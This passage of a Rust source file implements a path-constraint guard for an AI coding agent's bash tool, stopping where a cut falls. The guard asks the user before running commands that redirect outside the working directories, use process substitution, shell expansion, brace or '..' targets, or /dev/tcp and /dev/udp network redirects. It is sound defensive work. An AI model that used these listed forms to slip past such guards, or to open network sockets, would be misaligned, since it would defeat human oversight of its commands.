//! Bash path-constraint guard — port of the ASK-producing parts of claude-code
//! `src/tools/BashTool/pathValidation.ts::checkPathConstraints` (~:1013) plus
//! the helpers it calls (redirection-target extraction, `cd`-target validation,
//! process-substitution / shell-expansion handling, and the
//! `allWorkingDirectories` containment check via `pathInAllowedWorkingPath`).
//!
//! A bash command that writes (output redirection), `cd`-s, or uses process
//! substitution to touch a path OUTSIDE the allowed working directories (cwd +
//! `additional_working_dirs`) must ASK — even when a matching allow rule
//! (`Bash(echo:*)`, `Bash(cd:*)`, …) would otherwise auto-allow it. This mirrors
//! TS, where `checkPathConstraints` runs inside `bashToolHasPermission` and a
//! containment failure returns `behavior: 'ask'` regardless of allowlist rules.
//!
//! The companion [`crate::dangerous_removal`] guard covers the `rm`/`rmdir`
//! critical-path sub-piece; this module is its sibling, sharing the same wiring
//! slot in [`crate::policy::PermissionPolicy::authorize`] (after the deny/ask
//! walks, before the allow walk, roots- and shell-gated).
//!
//! # Scope ported (the ASK paths only)
//! TS `checkPathConstraints` produces a mix of `deny` (matched deny rule),
//! `ask`, and `passthrough` outcomes. The deny/allow-rule outcomes are already
//! produced by [`crate::policy`]'s rule walks; what is unique here — and not
//! reproducible by rule matching — is the **working-directory containment ASK**:
//! a path outside the working dirs prompts even past a matching allow rule. The
//! ported ASK triggers, in TS order, are:
//!
//! 1. **Process substitution** `>(…)` / `<(…)` → ask (`pathValidation.ts:1028`).
//! 2. **Shell-expansion in a redirect target** (`$`, `` ` ``, glob, `~`, …) →
//!    ask "Shell expansion syntax in paths requires manual approval"
//!    (`pathValidation.ts:1052`, fed by `hasDangerousExpansion`).
//! 3. **Compound `cd` + output redirection** → ask
//!    (`validateOutputRedirections`, `pathValidation.ts:935`).
//! 4. **Redirect target outside the working dirs** → ask "Output redirection to
//!    '…' was blocked. …" (`validateOutputRedirections`, `:972`).
//! 5. **Compound `cd` + write command** → ask (`validateCommandPaths`, `:645`).
//! 6. **`cd` target outside the working dirs** → ask "cd in '…' was blocked. …"
//!    (`validateCommandPaths`, `:677`, `ACTION_VERBS['cd'] = 'change directories
//!    to'`).
//!
//! # Documented divergences
//! - **No AST branch.** TS has a dual code path: an `astCommands`/`astRedirects`
//!   branch (tree-sitter argv) and a fallback `splitCommand_DEPRECATED` +
//!   shell-quote branch. This port keeps ONLY the split-command path the rest of
//!   the crate already uses ([`crate::shell_command::split_command`]) — so the
//!   process-substitution / shell-expansion regex guards (which TS gates behind
//!   `!astCommands`) are ALWAYS active here. This is the conservative direction
//!   (more asks, never fewer) and matches the non-AST TS path byte-for-byte.
//! - **Redirect extraction is a focused, quote-aware scanner** rather than a
//!   full shell-quote reimplementation. It recognizes the `>`/`>>`/`&>`/`&>>`/
//!   `>|`/`>!`/`N>`/`>&file` forms that carry a FILE target, classifies
//!   expansion-bearing targets as dangerous (parity with `hasDangerousExpansion`
//!   / `isSimpleTarget`), and skips fd-duplications (`2>&1`). It does not model
//!   heredocs or subshell-redirect bookkeeping (those are passthrough/`deny`
//!   concerns, not new asks).
//! - **Lexical containment**, reusing [`crate::filesystem`]'s
//!   `path_in_allowed_working_path` — same already-accepted no-`realpath`
//!   divergence as the rest of the crate.
//! - **Only the containment ASK**, not the deny-rule / allow-rule branches of
//!   `validatePath`/`isPathAllowed` (those are the policy walks' job). The
//!   `/dev/null` carve-out and the tilde/shell-expansion pre-guards ARE ported,
//!   because they change whether a target is asked-about at all.

use crate::filesystem::{path_in_allowed_working_path, FsRoots};
use std::path::{Path, PathBuf};

/// A path-constraint violation that must ASK, carrying the byte-locked message
/// and the `decisionReason.reason` text TS attaches (`type: 'other'`).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PathConstraintAsk {
    /// The byte-locked ask MESSAGE shown to the user.
    pub message: String,
    /// The `decisionReason` reason text (TS `type: 'other'`).
    pub reason: String,
    /// Exact path rejected by containment, when this Ask is path-scoped.  Guard
    /// asks such as process substitution or shell expansion leave this absent.
    pub blocked_path: Option<String>,
    /// This ask came from `permissions.blockReadsOutsideWorkingDirectories`, so
    /// the caller must render it as the `outsideReadsBlocked` safetyCheck
    /// (oracle `ppo`'s `decisionReason` passthrough) rather than the ordinary
    /// `type:"other"` path-constraint ask.
    pub outside_reads_blocked: bool,
}

/// Maximum directories listed verbatim before the "and N more" suffix — TS
/// `MAX_DIRS_TO_LIST` (`pathValidation.ts`, used by `formatDirectoryList`).
const MAX_DIRS_TO_LIST: usize = 5;

/// Port of TS `formatDirectoryList` (`pathValidation.ts:38-51`): single-quote
/// each directory and join with `, `; past [`MAX_DIRS_TO_LIST`] entries, list
/// the first few and append `, and N more`.
fn format_directory_list(dirs: &[String]) -> String {
    let dir_count = dirs.len();
    if dir_count <= MAX_DIRS_TO_LIST {
        return dirs
            .iter()
            .map(|d| format!("'{d}'"))
            .collect::<Vec<_>>()
            .join(", ");
    }
    let first = dirs[..MAX_DIRS_TO_LIST]
        .iter()
        .map(|d| format!("'{d}'"))
        .collect::<Vec<_>>()
        .join(", ");
    format!("{first}, and {} more", dir_count - MAX_DIRS_TO_LIST)
}

/// The set of allowed working directories — TS `allWorkingDirectories`
/// (`filesystem.ts:667-674`): the original cwd unioned with the additional
/// working directories. Returned as display strings (already
/// lexically-expanded against `roots`) for the byte-locked ask message, in the
/// SAME order TS iterates the `Set` (cwd first, then the additional dirs in
/// insertion order).
fn all_working_directories(roots: &FsRoots, additional: &[PathBuf]) -> Vec<String> {
    let mut out = Vec::with_capacity(1 + additional.len());
    out.push(roots.cwd.to_string_lossy().into_owned());
    for dir in additional {
        let s = dir.to_string_lossy().into_owned();
        if !out.contains(&s) {
            out.push(s);
        }
    }
    out
}

/// Working-dir set as `PathBuf`s for the containment check (cwd + additional).
fn working_dir_paths(roots: &FsRoots, additional: &[PathBuf]) -> Vec<PathBuf> {
    let mut dirs = Vec::with_capacity(1 + additional.len());
    dirs.push(roots.cwd.clone());
    dirs.extend(additional.iter().cloned());
    dirs
}

/// TS process-substitution regex (`pathValidation.ts:1028`):
/// `/>>\s*>\s*\(|>\s*>\s*\(|<\s*\(/`. Matches `>(`/`>>(` (output process subst,
/// possibly with whitespace between the operator chars) or `<(` (input process
/// subst). We scan the raw command string the same way.
fn has_process_substitution(command: &str) -> bool {
    let bytes = command.as_bytes();
    let n = bytes.len();
    let is_ws = |b: u8| b == b' ' || b == b'\t';
    let skip_ws = |mut j: usize| {
        while j < n && is_ws(bytes[j]) {
            j += 1;
        }
        j
    };
    let mut i = 0;
    while i < n {
        match bytes[i] {
            b'<' => {
                // `<` \s* `(`
                let j = skip_ws(i + 1);
                if j < n && bytes[j] == b'(' {
                    return true;
                }
            }
            b'>' => {
                // `>` \s* `(`  OR  `>` `>` (with optional ws) \s* `(`
                let after_first = skip_ws(i + 1);
                if after_first < n && bytes[after_first] == b'(' {
                    return true;
                }
                // `>` \s* `>` \s* `(`  (the `>>\s*>\s*\(` and `>\s*>\s*\(` arms
                // both reduce to: a second `>` then ws then `(`).
                if after_first < n && bytes[after_first] == b'>' {
                    let after_second = skip_ws(after_first + 1);
                    if after_second < n && bytes[after_second] == b'(' {
                        return true;
                    }
                }
            }
            _ => {}
        }
        i += 1;
    }
    false
}

/// Does `target` carry shell-expansion / glob / history / tilde syntax that a
/// redirect target can't be safely path-validated with? — mirrors 2.1.211's
/// `eLe` dangerous-classification for a redirect target `g`:
/// `/^~|[*?[]/.test(g)` (leading `~` or a `*`/`?`/`[` anywhere) and
/// `g.startsWith("!") || g.startsWith("=")`. `$`/backtick expansions surface via
/// parse-tree nodes in `eLe`; the port (no AST) approximates them literally.
///
/// NOTE: `%` is NOT dangerous here — it is Windows-gated inside `EUr` (create
/// op), not `eLe`. `{`/`}` are NOT dangerous either — they flow to `EUr`'s
/// create-op brace guard (see [`check_path_constraints`]). This is why a bare
/// `file%1` redirect target passes and a braced target gets the brace message
/// rather than the shell-expansion one.
fn target_has_dangerous_expansion(target: &str) -> bool {
    if target.is_empty() {
        // Empty target: TS treats `''` as not-simple AND not-dangerous (handled
        // separately, never validated). Skipping it here is safe — bash would
        // emit an ambiguous-redirect error, not a write.
        return false;
    }
    target.contains('$')
        || target.contains('`')
        || target.contains('*')
        || target.contains('?')
        || target.contains('[')
        || target.starts_with('!')
        || target.starts_with('=')
        || target.starts_with('~')
}

/// `^[A-Za-z0-9./_-]+$` — the `>&` (fd-duplication-or-file) charset gate in
/// 2.1.211's `eLe` (`if(d&&!/^[A-Za-z0-9./_-]+$/.test(g))` → shell_expansion). A
/// `>&`-operator target with any other char is treated as dangerous.
fn redirect_target_charset_ok(s: &str) -> bool {
    !s.is_empty()
        && s.bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'/' | b'_' | b'-'))
}

/// One extracted output redirection: a file `target`, whether the target carried
/// dangerous expansion (→ shell-expansion ask), and whether it is a braced
/// write target (→ `EUr` create-op brace-guard ask).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum RedirectKind {
    Input,
    Output,
}

struct Redirection {
    kind: RedirectKind,
    target: String,
    /// Dangerous shell expansion (`eLe` shell_expansion) → "Shell expansion …".
    dangerous: bool,
    /// Non-dangerous target containing `{`/`}` → `EUr` create brace guard.
    brace: bool,
}

/// Strip ONE leading and ONE trailing `'`/`"` (TS `validatePath`'s
/// `path.replace(/^['"]|['"]$/g, '')`).
fn strip_surrounding_quotes(s: &str) -> &str {
    let mut t = s;
    if let Some(rest) = t.strip_prefix(['\'', '"']) {
        t = rest;
    }
    if let Some(rest) = t.strip_suffix(['\'', '"']) {
        t = rest;
    }
    t
}

/// Is every char of `s` an ASCII digit? (fd-number test, `^\d+$`).
fn is_all_digits(s: &str) -> bool {
    !s.is_empty() && s.bytes().all(|b| b.is_ascii_digit())
}

/// Is `s` an fd-duplication / close target rather than a pathname?
fn is_fd_duplication_target(s: &str) -> bool {
    s == "-" || is_all_digits(s)
}

/// Tokenize a subcommand into shell-ish tokens, keeping the redirection
/// OPERATORS (`>`, `>>`, `&>`, `&>>`, `>|`, `>&`, `N>`, `N>>`) as their own
/// tokens so the redirection scanner can pair an operator with its following
/// target. Quote- and escape-aware; surrounding quotes are stripped from value
/// tokens but a flag like `2>` keeps its digits.
///
/// This is a focused tokenizer for redirection extraction — it is NOT a full
/// shell parser. It recognizes the operator forms `checkPathConstraints` needs
/// to find FILE redirect targets; everything else flows through as a plain
/// token.
fn tokenize_redirects(sub: &str) -> Vec<Token> {
    let chars: Vec<char> = sub.chars().collect();
    let n = chars.len();
    let mut tokens = Vec::new();
    let mut cur = String::new();
    let mut has_cur = false;
    let mut in_single = false;
    let mut in_double = false;
    let mut i = 0;

    macro_rules! flush {
        () => {
            if has_cur {
                tokens.push(Token::Word(std::mem::take(&mut cur)));
                has_cur = false;
            }
        };
    }

    while i < n {
        let c = chars[i];
        if in_single {
            if c == '\'' {
                in_single = false;
            } else {
                cur.push(c);
            }
            i += 1;
            continue;
        }
        if in_double {
            if c == '\\' && i + 1 < n && matches!(chars[i + 1], '"' | '\\' | '$' | '`') {
                cur.push(chars[i + 1]);
                i += 2;
                continue;
            }
            if c == '"' {
                in_double = false;
            } else {
                cur.push(c);
            }
            i += 1;
            continue;
        }
        match c {
            ' ' | '\t' | '\n' | '\r' => {
                flush!();
            }
            '\'' => {
                in_single = true;
                has_cur = true;
            }
            '"' => {
                in_double = true;
                has_cur = true;
            }
            '\\' => {
                if i + 1 < n {
                    cur.push(chars[i + 1]);
                    i += 2;
                    has_cur = true;
                    continue;
                }
            }
            '>' | '<' | '&' | '|' => {
                // A redirection operator boundary. A bare fd-number prefix (the
                // `2` in `2>`) is part of the operator, not a word target — drop
                // it (the operator + a digit-only target already classify a
                // duplication like `2>&1`); otherwise flush the pending word.
                if has_cur && is_all_digits(&cur) {
                    cur.clear();
                    has_cur = false;
                } else {
                    flush!();
                }
                // Greedily consume the operator characters: `>`, `>>`, `&>`,
                // `&>>`, `>|`, `>!`, `>&`, `<`, `<<`, `|`, `||`, `&`, `&&`.
                let (op, consumed) = read_operator(&chars[i..]);
                i += consumed;
                tokens.push(Token::Op { op });
                continue;
            }
            _ => {
                cur.push(c);
                has_cur = true;
            }
        }
        i += 1;
    }
    if has_cur {
        tokens.push(Token::Word(cur));
    }
    tokens
}

/// A token from [`tokenize_redirects`].
enum Token {
    /// A plain word (quotes already stripped).
    Word(String),
    /// A redirection / control operator (any leading fd number is dropped).
    Op { op: String },
}

/// Read a maximal operator run starting at `chars[0]`, returning the operator
/// string and how many chars it consumed. Handles the multi-char redirection
/// and control operators relevant to redirect extraction.
fn read_operator(chars: &[char]) -> (String, usize) {
    let g = |k: usize| chars.get(k).copied();
    match (g(0), g(1), g(2)) {
        // `&>>`
        (Some('&'), Some('>'), Some('>')) => ("&>>".to_string(), 3),
        // `&>`
        (Some('&'), Some('>'), _) => ("&>".to_string(), 2),
        // `&&`
        (Some('&'), Some('&'), _) => ("&&".to_string(), 2),
        // `&`
        (Some('&'), _, _) => ("&".to_string(), 1),
        // `>>`
        (Some('>'), Some('>'), _) => (">>".to_string(), 2),
        // `>|`  `>!`  `>&`
        (Some('>'), Some('|'), _) => (">|".to_string(), 2),
        (Some('>'), Some('!'), _) => (">!".to_string(), 2),
        (Some('>'), Some('&'), _) => (">&".to_string(), 2),
        // `>`
        (Some('>'), _, _) => (">".to_string(), 1),
        // `<&`  `<>`  `<<`  `<`
        (Some('<'), Some('&'), _) => ("<&".to_string(), 2),
        (Some('<'), Some('>'), _) => ("<>".to_string(), 2),
        (Some('<'), Some('<'), _) => ("<<".to_string(), 2),
        (Some('<'), _, _) => ("<".to_string(), 1),
        // `||`  `|`
        (Some('|'), Some('|'), _) => ("||".to_string(), 2),
        (Some('|'), _, _) => ("|".to_string(), 1),
        // Fallback (shouldn't happen — caller only enters on these chars).
        (Some(c), _, _) => (c.to_string(), 1),
        (None, _, _) => (String::new(), 0),
    }
}

/// Whether an operator string carries a stdout/stderr FILE-output meaning whose
/// next word is a file target. `>`, `>>`, `&>`, `&>>`, `>|`, `>!`, `>&` all do;
/// `<`, `<>`, and file-backed `<&` are read targets; heredocs and control
/// operators do not.
fn redirect_kind_for_op(op: &str) -> Option<RedirectKind> {
    match op {
        ">" | ">>" | "&>" | "&>>" | ">|" | ">!" | ">&" => Some(RedirectKind::Output),
        "<" | "<>" | "<&" => Some(RedirectKind::Input),
        _ => None,
    }
}

/// Extract file-backed redirections from one subcommand. Mirrors the FILE-target
/// subset of TS `extractOutputRedirections` + the 2.1.232 input-redirection
/// parity path: for each file redirect operator, the following word is the
/// target. A `>&` followed by a pure fd number (`2>&1`, `>&2`) is a duplication,
/// NOT a file — skipped (TS `astRedirectsToOutputRedirections`/`handleRedirection`).
/// Targets are classified dangerous (shell expansion) vs. simple (a path to
/// validate).
fn extract_redirections(sub: &str) -> Vec<Redirection> {
    let tokens = tokenize_redirects(sub);
    let mut out = Vec::new();
    let mut idx = 0;
    while idx < tokens.len() {
        if let Token::Op { op, .. } = &tokens[idx] {
            if let Some(kind) = redirect_kind_for_op(op) {
                // The target is the next WORD token (if any).
                if let Some(Token::Word(raw)) = tokens.get(idx + 1) {
                    // `>&N` / `<&N` and the close forms `>&-` / `<&-` are fd
                    // operations, not file-backed redirects.
                    if matches!(op.as_str(), ">&" | "<&") && is_fd_duplication_target(raw) {
                        idx += 2;
                        continue;
                    }
                    let target = strip_surrounding_quotes(raw).to_string();
                    // `eLe`: dangerous = leading `~`/glob/`!`/`=`/`$`/backtick,
                    // OR (for a `>&` operator) a non-`[A-Za-z0-9./_-]` charset.
                    let dangerous = target_has_dangerous_expansion(&target)
                        || (op == ">&" && !redirect_target_charset_ok(&target));
                    // A non-dangerous target with `{`/`}` is a braced write
                    // target → `EUr` create-op brace guard (not shell_expansion).
                    let brace = !dangerous
                        && kind == RedirectKind::Output
                        && (target.contains('{') || target.contains('}'));
                    out.push(Redirection {
                        kind,
                        target,
                        dangerous,
                        brace,
                    });
                    idx += 2;
                    continue;
                }
            }
        }
        idx += 1;
    }
    out
}

/// `^/dev/(tcp|udp)/` — a bash network-device pseudo-path. A redirect to/from one
/// opens a TCP/UDP socket (2.1.211 `network_device`).
fn is_network_device_target(target: &str) -> bool {
    let t = strip_surrounding_quotes(target);
    t.starts_with("/dev/tcp/") || t.starts_with("/dev/udp/")
}

/// Does any redirect — output (`>`, `>>`, …) OR input (`<`) — target a
/// `/dev/tcp/`/`/dev/udp/` network device? 2.1.211 flags these as `network_device`
/// (EPg for output, the `<` fallback in eLe for input). `<<` heredocs are
/// excluded (their operand is a delimiter, not a file).
pub(crate) fn command_has_network_device_redirect(subs: &[String]) -> bool {
    for sub in subs {
        let tokens = tokenize_redirects(sub);
        let mut idx = 0;
        while idx < tokens.len() {
            if let Token::Op { op } = &tokens[idx] {
                if redirect_kind_for_op(op).is_some() {
                    if let Some(Token::Word(raw)) = tokens.get(idx + 1) {
                        if is_network_device_target(raw) {
                            return true;
                        }
                    }
                }
            }
            idx += 1;
        }
    }
    false
}

/// Outcome of parsing a `cd` subcommand's arguments — mirrors 2.1.211's `cd`
/// COMMAND_EXTRACTOR (`GQt.cd`, first-positional-only) plus the `gPg.cd`
/// multi-positional guard (`yPg`).
enum CdParse {
    /// The subcommand's first word is not `cd`.
    NotCd,
    /// `cd` with ≥2 positional directory arguments — the zsh `cd OLD NEW`
    /// substitution form, which cannot be statically validated → ask.
    MultiPositional,
    /// `cd` with exactly one positional directory target to validate.
    Target(String),
    /// Bare `cd` (or flags only) → the home dir. Treated as benign (a `cd` with
    /// no positional target is not a write and, matching the port's prior
    /// behavior, is not containment-checked).
    Bare,
}

/// Port of 2.1.211's `Bx` positional extractor: collect the positional
/// (non-flag) args from a command's argv. A `--` terminator turns on
/// "everything after is positional"; a bare `-` counts as a positional; a
/// leading `-x` flag (`-` prefix, not exactly `-`) before the first positional
/// is skipped; once the first positional (or `--`) is seen, every subsequent arg
/// is positional (including later flags).
fn cd_positionals(args: &[String]) -> Vec<&String> {
    let mut out = Vec::new();
    let mut seen_double_dash = false; // TS `r`
    let mut seen_positional = false; // TS `n`
    for a in args {
        if seen_double_dash || seen_positional {
            out.push(a);
        } else if a == "--" {
            seen_double_dash = true;
        } else if a == "-" || !a.starts_with('-') {
            out.push(a);
            seen_positional = true;
        }
        // else: a flag (`-P`, `-L`, …) before the first positional → skipped.
    }
    out
}

/// Parse a subcommand's leading `cd` argv into a [`CdParse`]. Mirrors
/// 2.1.211's `GQt.cd` (extract only the FIRST positional) gated by `gPg.cd`
/// (≥2 positionals → the zsh multi-positional ask, `yPg`).
fn parse_cd(sub: &str) -> CdParse {
    // Reuse the redirect tokenizer's word splitting, but only the leading words
    // up to any redirection/control operator form the `cd` argv.
    let tokens = tokenize_redirects(sub);
    let mut words = Vec::new();
    for t in &tokens {
        match t {
            Token::Word(w) => words.push(w.clone()),
            Token::Op { .. } => break,
        }
    }
    let Some((base, args)) = words.split_first() else {
        return CdParse::NotCd;
    };
    if base != "cd" {
        return CdParse::NotCd;
    }
    let positional = cd_positionals(args);
    // `gPg.cd`: n <= 1 positional is OK; ≥2 → the zsh `cd OLD NEW` ask.
    if positional.len() > 1 {
        return CdParse::MultiPositional;
    }
    // `GQt.cd`: validate only the FIRST positional (identical to the single
    // element here); no positional → home dir (benign).
    match positional.first() {
        Some(first) => CdParse::Target((*first).clone()),
        None => CdParse::Bare,
    }
}

/// PARITY 2.1.263 `ppo(argv, cwd, ctx)` — the directory-changing commands the
/// oracle validates ALONGSIDE `cd`, extracted here as `(verb, target)`.
///
/// ```js
/// let d = argv[0].slice(argv[0].lastIndexOf("/")+1), p;
/// if (d === "pushd") { p = vh(argv.slice(1))[0]; if (p === undefined) return }
/// else if (d === "env") {
///   for (let i=1;i<argv.length;i++) { let C=argv[i];
///     if (C === "-C" || C === "--chdir") { p = argv[i+1]; break }
///     if (C.startsWith("--chdir=")) { p = C.slice(8); break }
///     if (C.startsWith("-C") && C.length > 2) { p = C.slice(2); break } }
///   if (p === undefined) return }
/// else return;
/// ```
///
/// `d` is the BASENAME of argv[0], so `/usr/bin/env -C /etc …` is recognised.
/// The verb is returned because the refusal copy interpolates it (`${d} moves
/// later reads …`).
///
/// ⚠️ Only the READ-BLOCK branch consumes this. With the block off the oracle's
/// `PE(target,…,"read")` ALLOWS a plain outside path for these verbs (it refuses
/// only on a deny rule, `--restricted`, or the block), so wiring them into the
/// port's generic `cd` containment ask would ask where the binary allows.
fn parse_dir_change(sub: &str) -> Option<(String, String)> {
    let mut words = Vec::new();
    for t in &tokenize_redirects(sub) {
        match t {
            Token::Word(w) => words.push(w.clone()),
            Token::Op { .. } => break,
        }
    }
    let (base, args) = words.split_first()?;
    let verb = base.rsplit('/').next().unwrap_or(base).to_string();
    match verb.as_str() {
        "pushd" => cd_positionals(args)
            .first()
            .map(|target| (verb.clone(), (*target).clone())),
        "env" => {
            let iter = args.iter().enumerate();
            for (idx, arg) in iter {
                if arg == "-C" || arg == "--chdir" {
                    return args.get(idx + 1).map(|t| (verb.clone(), t.clone()));
                }
                if let Some(rest) = arg.strip_prefix("--chdir=") {
                    return Some((verb.clone(), rest.to_string()));
                }
                if arg.starts_with("-C") && arg.len() > 2 {
                    return Some((verb.clone(), arg[2..].to_string()));
                }
            }
            None
        }
        _ => None,
    }
}

/// Does any subcommand `cd` somewhere? (TS `compoundCommandHasCd`.) Used to gate
/// the "cd + write/redirection" asks. A leading-word `cd` in ANY subcommand
/// counts.
fn compound_has_cd(subs: &[String]) -> bool {
    subs.iter().any(|s| {
        tokenize_redirects(s)
            .into_iter()
            .find_map(|t| match t {
                Token::Word(w) => Some(w),
                Token::Op { .. } => None,
            })
            .is_some_and(|first| first == "cd")
    })
}

/// Check a bash `command` for path-constraint violations that must ASK even when
/// an allow rule matches. Returns the FIRST violation in TS evaluation order, or
/// `None` if the command stays within the working dirs.
///
/// `roots` supplies the cwd / home for lexical expansion and containment;
/// `additional` are the extra allowed working dirs (TS
/// `additionalWorkingDirectories`).
#[must_use]
pub fn check_path_constraints(
    command: &str,
    roots: &FsRoots,
    additional: &[PathBuf],
    read_block_dirs: Option<&[PathBuf]>,
) -> Option<PathConstraintAsk> {
    // 1. Process substitution (`>(…)`/`<(…)`) — `pathValidation.ts:1028`. We are
    //    always on the non-AST path (documented divergence), so this guard is
    //    always live.
    if has_process_substitution(command) {
        return Some(PathConstraintAsk {
            message: "Process substitution (>(...) or <(...)) can execute arbitrary commands and requires manual approval".to_string(),
            reason: "Process substitution requires manual approval".to_string(),
            blocked_path: None,
            outside_reads_blocked: false,
        });
    }

    let subs = crate::shell_command::split_command(command);
    let has_cd = compound_has_cd(&subs);
    let work_dirs = working_dir_paths(roots, additional);

    // 2/3/4. Redirections (`validateOutputRedirections`, `pathValidation.ts:924`).
    //    Collect across all subcommands. A dangerous-expansion target shortcuts
    //    to the shell-expansion ask; a cd+redirection compound shortcuts to its
    //    own ask; otherwise each simple target is containment-checked.
    let mut all_redirs: Vec<Redirection> = Vec::new();
    for sub in &subs {
        all_redirs.extend(extract_redirections(sub));
    }

    // 2a. Network-device redirect (`/dev/tcp/`, `/dev/udp/`) — 2.1.211
    //     `network_device`. Applies to output AND input (`cat < /dev/tcp/host/port`)
    //     redirects and takes precedence over the shell-expansion classification
    //     (EPg sets `network_device` and `continue`s past the expansion check).
    if command_has_network_device_redirect(&subs) {
        return Some(PathConstraintAsk {
            message: "Redirect involving /dev/tcp or /dev/udp opens a network connection"
                .to_string(),
            reason: "Redirect involving /dev/tcp or /dev/udp opens a network connection"
                .to_string(),
            blocked_path: None,
            outside_reads_blocked: false,
        });
    }

    // 2. Shell expansion in a redirect target (`hasDangerousRedirection`,
    //    `pathValidation.ts:1052`). Checked before the cd-compound guard, mirroring
    //    TS, where `hasDangerousRedirection` is evaluated immediately after
    //    `extractOutputRedirections` and before `validateOutputRedirections`.
    if all_redirs.iter().any(|r| r.dangerous) {
        return Some(PathConstraintAsk {
            message: "Shell expansion syntax in paths requires manual approval".to_string(),
            reason: "Shell expansion syntax in paths requires manual approval".to_string(),
            blocked_path: None,
            outside_reads_blocked: false,
        });
    }

    // 3. Compound `cd` + output redirection (`validateOutputRedirections` /
    //    `SPg`, `pathValidation.ts:935`). `SPg` only raises this ask when a
    //    cd-compound has a redirect target OTHER than `/dev/null`
    //    (`n && e.some(o => o.target !== "/dev/null")`), so a `/dev/null`-only
    //    redirect set (`cmd > /dev/null 2>&1`) falls through to normal cd/target
    //    validation instead of over-asking.
    if has_cd
        && all_redirs
            .iter()
            .any(|r| r.kind == RedirectKind::Output && r.target != "/dev/null")
    {
        return Some(PathConstraintAsk {
            message: "Commands that change directories and write via output redirection require explicit approval to ensure paths are evaluated correctly. For security, LingXi cannot automatically determine the final working directory when 'cd' is used in compound commands.".to_string(),
            reason: "Compound command contains cd with output redirection - manual approval required to prevent path resolution bypass".to_string(),
            blocked_path: None,
            outside_reads_blocked: false,
        });
    }

    // 4. Redirect target outside the working dirs (`validateOutputRedirections`,
    //    `pathValidation.ts:946-997`). `/dev/null` is always safe.
    for r in &all_redirs {
        if r.target == "/dev/null" {
            continue;
        }
        // `EUr` create-op brace guard (evaluated before containment): bash may
        // brace-expand `{a,b}` to paths outside the working dir → ask with the
        // byte-exact brace message (distinct from the shell-expansion ask).
        if r.brace {
            return Some(PathConstraintAsk {
                message: "Brace characters in write target require manual approval \u{2014} bash may brace-expand to paths outside the working directory".to_string(),
                reason: "Brace characters in write target require manual approval \u{2014} bash may brace-expand to paths outside the working directory".to_string(),
                blocked_path: Some(r.target.clone()),
                outside_reads_blocked: false,
            });
        }
        // `X6r` `..`-after-directory pre-guard (claude-code `Q6r`/validatePath runs
        // `X6r(o)` on the redirect target BEFORE containment — the `"create"` call
        // site). A `..` segment after a real directory segment may follow a symlink
        // out of the working dir, so it ASKS even when the path lexically collapses
        // back inside cwd — `expand_redirect_target` (→ `expand_path`) would
        // otherwise collapse `sub/../out.txt` to `out.txt` and mask the escape
        // (PATH-04 under-ask). Runs on the dequoted RAW target: the `..`-after-real-
        // segment property is invariant under tilde expansion.
        if crate::command_path_containment::dotdot_after_directory_segment(
            strip_surrounding_quotes(&r.target),
        ) {
            return Some(PathConstraintAsk {
                message: "Path contains '..' traversal after a directory segment, which may follow a symlink outside the working directory".to_string(),
                reason: "Path contains '..' traversal after a directory segment, which may follow a symlink outside the working directory".to_string(),
                blocked_path: Some(r.target.clone()),
                outside_reads_blocked: false,
            });
        }
        let resolved = expand_redirect_target(&r.target, roots);
        if !path_in_allowed_working_path(Path::new(&resolved), &work_dirs, roots) {
            let resolved_disp = resolved.to_string_lossy();
            if r.kind == RedirectKind::Input {
                return Some(PathConstraintAsk {
                    message: format!(
                        "Input redirection from '{resolved_disp}' was blocked. For security, LingXi may only read files in the allowed working directories for this session."
                    ),
                    reason: format!(
                        "Input redirection from '{resolved_disp}' was blocked. For security, LingXi may only read files in the allowed working directories for this session."
                    ),
                    blocked_path: Some(resolved_disp.into_owned()),
                    outside_reads_blocked: false,
                });
            }
            let dirs = all_working_directories(roots, additional);
            let dir_list = format_directory_list(&dirs);
            return Some(PathConstraintAsk {
                message: format!(
                    "Output redirection to '{resolved_disp}' was blocked. For security, LingXi may only write to files in the allowed working directories for this session: {dir_list}."
                ),
                // TS attaches no custom reason for the containment ask; the
                // message doubles as the reason in the Rust `Other` slot.
                reason: format!(
                    "Output redirection to '{resolved_disp}' was blocked. For security, LingXi may only write to files in the allowed working directories for this session: {dir_list}."
                ),
                blocked_path: Some(resolved_disp.into_owned()),
                outside_reads_blocked: false,
            });
        }
    }

    // `ppo` — pushd / env -C|--chdir, READ BLOCK ONLY (see `parse_dir_change`).
    if let Some(block_dirs) = read_block_dirs {
        for sub in &subs {
            let Some((verb, target)) = parse_dir_change(sub) else {
                continue;
            };
            // `if (hi(p)) return Op(d)` — a target only known at run time.
            if target_has_shell_expansion_cd(&target) {
                return Some(PathConstraintAsk {
                    message: format!(
                        "{verb} names a path that is computed at run time, which cannot be checked against the read block (permissions.blockReadsOutsideWorkingDirectories)"
                    ),
                    reason: format!(
                        "{verb} names a path that is computed at run time, which cannot be checked against the read block (permissions.blockReadsOutsideWorkingDirectories)"
                    ),
                    blocked_path: Some(target.clone()),
                    outside_reads_blocked: true,
                });
            }
            let resolved = expand_cd_target(&target, roots);
            if !path_in_allowed_working_path(Path::new(&resolved), block_dirs, roots) {
                return Some(PathConstraintAsk {
                    message: format!(
                        "{verb} moves later reads to a directory outside the working directories, which the read block does not allow without asking (permissions.blockReadsOutsideWorkingDirectories). Add the directory with /add-dir, or remove that setting."
                    ),
                    reason: crate::policy::OUTSIDE_READS_BLOCKED_REASON.to_string(),
                    blocked_path: Some(resolved.to_string_lossy().into_owned()),
                    outside_reads_blocked: true,
                });
            }
        }
    }

    // 5/6. `cd` target validation (`validateCommandPaths`, `pathValidation.ts:603`).
    for sub in &subs {
        let cd_arg = match parse_cd(sub) {
            CdParse::NotCd | CdParse::Bare => continue,
            // `gPg.cd` failed (≥2 positional dir args): the zsh `cd OLD NEW`
            // substitution form can't be statically validated → ask
            // (byte-exact, no product name; `yPg`, `bashMissKind:cd-multi-positional`).
            CdParse::MultiPositional => {
                return Some(PathConstraintAsk {
                    message: "cd with two or more directory arguments requires manual approval. zsh's \"cd OLD NEW\" form substitutes OLD\u{2192}NEW in $PWD, producing a target path that cannot be statically validated.".to_string(),
                    reason: "cd with two or more directory arguments".to_string(),
                    blocked_path: None,
                    outside_reads_blocked: false,
                });
            }
            CdParse::Target(target) => target,
        };
        // 5. Compound `cd` + write — TS asks for ANY write op in a cd-compound
        //    (`pathValidation.ts:645`). `cd` itself is a read op, so this fires
        //    only via the redirection branch above OR a non-cd write subcommand.
